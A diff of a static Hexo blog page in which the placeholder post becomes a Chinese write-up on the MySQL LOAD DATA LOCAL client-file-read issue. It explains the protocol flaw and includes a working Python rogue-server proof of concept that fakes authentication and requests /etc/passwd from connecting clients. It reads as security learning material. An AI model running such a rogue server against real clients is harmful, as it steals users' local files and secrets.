@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Hello World · ShallowRiver</title>
+    <title>MySQL LOAD DATA读取客户端任意文件 · ShallowRiver</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">ShallowRiver</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Hello World</a>
+                <a href="#" class="post-name">MySQL LOAD DATA读取客户端任意文件</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Hello World
+            MySQL LOAD DATA读取客户端任意文件
             <!-- 404 -->
             
         </h1>
@@ -264,14 +264,20 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Mysql">Mysql</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">73</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">863</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/04/29</span>
+                    <span class="post-intro-time">2019/09/22</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,24 +401,23 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h1 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h1><p>mysql的LOAD DATA INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &apos;分隔符&apos;;</span><br><span class="line">load data local infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &apos;分隔符&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD DATA LOCAL INFILE。<br><img src="https://i.imgur.com/QyC0B70.png" alt></p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><pre><code>客户端：hi,现在我把我的/etc/passwd文件插入test表格里
+服务端：好的，把/etc/passwd文件发过来吧
+客户端：好的，这是我的/etc/passwd文件
+</code></pre><p>而对于这个请求，mysql并没有强制限制必须先由客户端发起load data，一个伪造的服务端可以在任何时候回复一个 file-transfer 请求，比如说最开始客户端请求初始化查询的时候。<br>    客户端：hi,现在我要查询一下版本信息<br>    服务端：好的，把/etc/passwd文件发过来吧<br>    客户端：好的，这是我的/etc/passwd文件<br>客户端连接后会查询一下mysql的版本，如果我们在客户端发送查询之后，返回一个Response TABULAR数据包，即服务端向客户端发送了文件名的数据包，如果我们把这个文件名设置成我们想要读取的文件，那么我们就可以读取客户端的任意文件了。正如官方文档所写的 In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the <a href="https://dev.mysql.com/doc/refman/8.0/en/load-data.html" title="13.2.7 LOAD DATA Syntax" target="_blank" rel="noopener">LOAD DATA</a> statement.<br>也就是说想要读取哪个文件是服务端说了算，跟客户端所request的文件名没有关系。</p>
+<p>最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。<br>不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上–enable-local-infile。<br>下面给出一个简单的poc:<br>第一次发送一个greeting包，是服务端向客户端发送的握手初始化包<br>第二次是哭护短发送登陆验证包的时候，直接返回一个验证成功的应答，这样客户端不需要输入账户密码就可以连接上我们恶意构造的服务端<br>第三次发送的是一个file transfer包，直接让客户端发送我们想要的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8 </span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"/etc/passwd"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3306</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">参考文章</a><br><a href="https://www.cnblogs.com/apossin/p/10127496.html" target="_blank" rel="noopener">参考文章</a><br><a href="http://www.bubuko.com/infodetail-2886722.html" target="_blank" rel="noopener">参考文章</a><br><a href="https://www.cnblogs.com/xm17/p/9691070.html" target="_blank" rel="noopener">https://www.cnblogs.com/xm17/p/9691070.html</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">ShallowRiver</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/04/29/hello-world/">http://yoursite.com/2019/04/29/hello-world/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/04/29/hello-world/">April 29th 2019, 8:56:49 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/04/29/hello-world/">April 29th 2019, 8:56:49 pm</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/09/22/Mysql-load-data-读取客户端任意文件/">http://yoursite.com/2019/09/22/Mysql-load-data-读取客户端任意文件/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/09/22/Mysql-load-data-读取客户端任意文件/">September 22nd 2019, 10:02:55 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/09/22/Mysql-load-data-读取客户端任意文件/">September 24th 2019, 8:35:09 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -421,12 +426,17 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2019/04/29/条件竞争/" title="ctf条件竞争">
-                    <div class="nextTitle">ctf条件竞争</div>
+                <a href="/2019/09/24/Mysql文件读写/" title="Mysql文件读写权限">
+                    <div class="nextTitle">Mysql文件读写权限</div>
                 </a>
             
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/09/18/linux下常见的histroty/" title="Linux下常见的history">
+                    <div class="prevTitle">Linux下常见的history</div>
+                </a>
             
         </li>
     </ul>
@@ -544,7 +554,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LOAD-DATA-INFILE"><span class="toc-number">1.</span> <span class="toc-text">LOAD DATA INFILE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -683,9 +693,40 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 12
+        Total : 13
         </div>
         <!-- search  -->
         
@@ -701,8 +742,55 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/22</span><a class="archive-post-title" href="/2019/07/22/flask客户端session伪造/">flask题目的思考</a>
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2019/09/24/Mysql文件读写/">Mysql文件读写权限</a>
         </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/2019/09/22/Mysql-load-data-读取客户端任意文件/">MySQL LOAD DATA读取客户端任意文件</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/2019/09/18/linux下常见的histroty/">Linux下常见的history</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/06/05/密码学/">RSA</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/05/21/php本地文件包含/">php本地文件包含，php伪协议</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
     
     
         <li class="archive-post-item">
@@ -744,64 +832,28 @@ top:50vh;
             <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/条件竞争/">ctf条件竞争</a>
         </li>
     
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/04/29/hello-world/">Hello World</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/05/21/php本地文件包含/">php本地文件包含，php伪协议</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href="/2019/06/05/密码学/">RSA</a>
-        </li>
-    
     </ul></div>
   </div>
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="Crpyto"><span class="iconfont-archer">&#xe606;</span>Crpyto</span>
-    
-        <span class="sidebar-tag-name" data-tags="二次注入 sql注入 代码审计"><span class="iconfont-archer">&#xe606;</span>二次注入 sql注入 代码审计</span>
+        <span class="sidebar-tag-name" data-tags="Mysql"><span class="iconfont-archer">&#xe606;</span>Mysql</span>
     
         <span class="sidebar-tag-name" data-tags="scrapy 爬虫"><span class="iconfont-archer">&#xe606;</span>scrapy 爬虫</span>
     
-        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
-    
         <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
     
+        <span class="sidebar-tag-name" data-tags="Git"><span class="iconfont-archer">&#xe606;</span>Git</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf-wp"><span class="iconfont-archer">&#xe606;</span>ctf-wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="二次注入 sql注入 代码审计"><span class="iconfont-archer">&#xe606;</span>二次注入 sql注入 代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crpyto"><span class="iconfont-archer">&#xe606;</span>Crpyto</span>
     
         <span class="sidebar-tag-name" data-tags="华中赛区国赛线下赛 flask"><span class="iconfont-archer">&#xe606;</span>华中赛区国赛线下赛 flask</span>
     
